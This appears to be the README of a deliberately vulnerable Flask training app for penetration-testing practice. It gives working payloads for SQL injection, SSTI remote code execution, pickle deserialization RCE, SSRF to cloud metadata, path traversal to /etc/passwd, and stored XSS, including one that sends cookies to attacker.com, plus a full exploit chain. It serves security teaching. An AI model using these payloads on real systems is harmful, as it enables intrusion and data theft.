# InsecureHub 🔐

> **⚠️ FOR EDUCATIONAL PURPOSES ONLY. DO NOT DEPLOY IN PRODUCTION.**

A deliberately vulnerable Flask web application designed for learning web application penetration testing. Built to simulate a real-world code-sharing platform (like GitHub/Pastebin) with intentional security flaws.

---

## 🏗️ What Is This?

InsecureHub is a realistic social platform where developers share code snippets, notes, and files. It looks and feels like a real app — but it's packed with classic web vulnerabilities used in bug bounty hunting and CTF competitions.

---

## 🚨 Vulnerabilities Included

| # | Vulnerability | Location | Flag |
|---|--------------|----------|------|
| 1 | **IDOR** | `/note/<id>`, `/post/<id>`, `/file/download/<id>`, `/api/user/<id>` | `FLAG{IDOR_NOTE_ACCESS}` |
| 2 | **SSTI** | `/render`, `/bio/<id>`, `/profile/edit` | Leaks `SECRET_KEY` + RCE |
| 3 | **SQL Injection** | `/search?q=` | Dumps users table |
| 4 | **SSRF** | `/fetch` | Access internal endpoints |
| 5 | **Pickle RCE** | `remember_me` cookie → `/restore-session` | OS command execution |
| 6 | **Path Traversal** | `/file/read?name=` | Read arbitrary files |
| 7 | **Stored XSS** | Post comments | Script execution |
| 8 | **Weak Reset Token** | `/forgot-password` | Predict MD5 token |
| 9 | **Info Disclosure** | `/debug` | Leaks secret key, env vars |
| 10 | **Broken Auth** | MD5 passwords, no rate limiting | Brute force / crack hashes |

---

## 🚀 Quick Start

### 1. Install Dependencies

```bash
cd InsecureHub
pip install -r requirements.txt
```

### 2. Run the App

```bash
python app.py
```

App runs at: **http://127.0.0.1:5000**

### 3. Test Credentials

| Username | Password | Role |
|----------|----------|------|
| `admin`  | `admin123` | Admin |
| `alice`  | `password123` | User |
| `bob`    | `bob123` | User |

---

## 🧪 Testing the Vulnerabilities

### 1. IDOR (Insecure Direct Object Reference)

**Manual:**
```
# Access admin's private note (you're logged in as alice)
GET /note/1

# Access admin's private post
GET /post/2

# Download admin's private file
GET /file/download/1

# Dump user data via API
GET /api/user/1
GET /api/user/2
GET /api/user/3
```

**Automated:**
```bash
python exploits/exploit_all.py
# Select [1] IDOR
```

---

### 2. SQL Injection

**Manual (in browser search bar):**
```sql
' OR 1=1--
' UNION SELECT 1,2,3,4,5,6,7,8--
' UNION SELECT id,username,password,email,bio,role,reset_token,created_at FROM users--
```

**Using sqlmap:**
```bash
sqlmap -u "http://127.0.0.1:5000/search?q=test" \
  --cookie="session=YOUR_SESSION_COOKIE" \
  --dbs --dump --batch
```

---

### 3. SSTI (Server-Side Template Injection)

**Manual — go to `/render` or edit your bio:**
```
# Basic test
{{7*7}}

# Leak secret key
{{config.SECRET_KEY}}

# Dump all config
{{config}}

# List subclasses (find RCE gadget)
{{''.__class__.__mro__[1].__subclasses__()}}

# RCE (index may vary — find subprocess.Popen or os._wrap_close)
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['os'].popen('id').read()}}

# Alternative RCE
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Stored SSTI via bio:**
1. Go to `/profile/edit`
2. Set bio to: `{{config.SECRET_KEY}}`
3. Visit `/bio/YOUR_USER_ID`

---

### 4. SSRF (Server-Side Request Forgery)

**Manual — go to `/fetch`:**
```
# Access internal debug endpoint
http://127.0.0.1:5000/debug

# Access internal admin panel
http://127.0.0.1:5000/admin

# Access internal API
http://localhost:5000/api/user/1

# Try AWS metadata (if on EC2)
http://169.254.169.254/latest/meta-data/

# Read local files (if requests supports file://)
file:///etc/passwd
```

---

### 5. Pickle RCE (Deserialization)

**Manual — craft malicious cookie:**
```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned.txt",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

Then:
1. Set `remember_me` cookie to the payload
2. Visit `http://127.0.0.1:5000/restore-session`
3. Check `/tmp/pwned.txt`

**Automated:**
```bash
python exploits/exploit_all.py
# Select [5] Pickle RCE
```

---

### 6. Path Traversal

**Manual:**
```
# Read app source code
GET /file/read?name=../app.py

# Read /etc/passwd
GET /file/read?name=../../etc/passwd

# Read the database
GET /file/read?name=../insecurehub.db

# Read admin's secret file
GET /file/read?name=admin_secret.txt
```

---

### 7. Stored XSS

**Manual — add a comment to any post:**
```html
<script>alert(document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
<svg onload="alert(1)">
```

---

### 8. Weak Password Reset Token

**Manual:**
```python
import hashlib
# Token is MD5 of username
token = hashlib.md5(b"admin").hexdigest()
# Use at: /reset-password?token=<token>
```

**Steps:**
1. Go to `/forgot-password`
2. Enter `admin`
3. Compute `md5("admin")` = `21232f297a57a5a743894a0e4a801fc3`
4. Visit `/reset-password?token=21232f297a57a5a743894a0e4a801fc3`
5. Set new password

---

### 9. Information Disclosure

```
GET /debug
```
Returns: secret key, database path, environment variables, session data.

---

## 🔗 Exploit Chain Example

**Full chain: Anonymous → RCE**

1. **Enumerate users** via `/api/user/1` (IDOR)
2. **Crack MD5 hash** (`admin123` → `0192023a7bbd73250516f069df18b500`)
3. **Login as admin** with cracked password
4. **Inject SSTI** via `/render`: `{{config.SECRET_KEY}}`
5. **Forge admin session** using leaked secret key
6. **RCE** via SSTI: `{{''.__class__...os.popen('id').read()}}`

---

## 📁 Project Structure

```
InsecureHub/
├── app.py                  # Main Flask app (all vulnerabilities)
├── requirements.txt        # Dependencies
├── .gitignore
├── README.md
├── static/
│   └── style.css           # Dark cyberpunk CSS
├── templates/
│   ├── base.html           # Base layout
│   ├── index.html          # Homepage
│   ├── login.html          # Login
│   ├── register.html       # Register
│   ├── dashboard.html      # User dashboard
│   ├── profile.html        # User profile (IDOR)
│   ├── edit_profile.html   # Edit profile (SSTI)
│   ├── bio.html            # Bio renderer (SSTI)
│   ├── search.html         # Search (SQLi)
│   ├── fetch_url.html      # URL fetcher (SSRF)
│   ├── render_template.html# Template renderer (SSTI)
│   ├── notes.html          # Notes list (IDOR)
│   ├── view_note.html      # Note viewer (IDOR)
│   ├── new_note.html       # New note
│   ├── new_post.html       # New post
│   ├── view_post.html      # Post viewer (XSS)
│   ├── files.html          # Files (Path Traversal + IDOR)
│   ├── upload_file.html    # File upload
│   ├── file_read.html      # File reader output
│   ├── admin.html          # Admin panel
│   ├── forgot_password.html# Forgot password (Weak token)
│   └── reset_password.html # Reset password
├── exploits/
│   └── exploit_all.py      # Automated exploit scripts
└── uploads/                # Uploaded files (gitignored)
```

---

## 🐙 GitHub Setup

```bash
# Initialize git
git init
git add .
git commit -m "Initial commit: InsecureHub vulnerable Flask app"

# Create repo on GitHub (github.com/new)
# Then:
git remote add origin https://github.com/YOUR_USERNAME/InsecureHub.git
git branch -M main
git push -u origin main
```

> **Note:** The `.gitignore` excludes `insecurehub.db` and uploaded files to keep the repo clean.

---

## ⚠️ Disclaimer

This application is **intentionally vulnerable** and is designed **solely for educational purposes**. 

- ✅ Use on your local machine only
- ✅ Use for learning penetration testing
- ✅ Use in CTF competitions
- ❌ Do NOT deploy publicly
- ❌ Do NOT use against systems you don't own

---

## 📚 Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
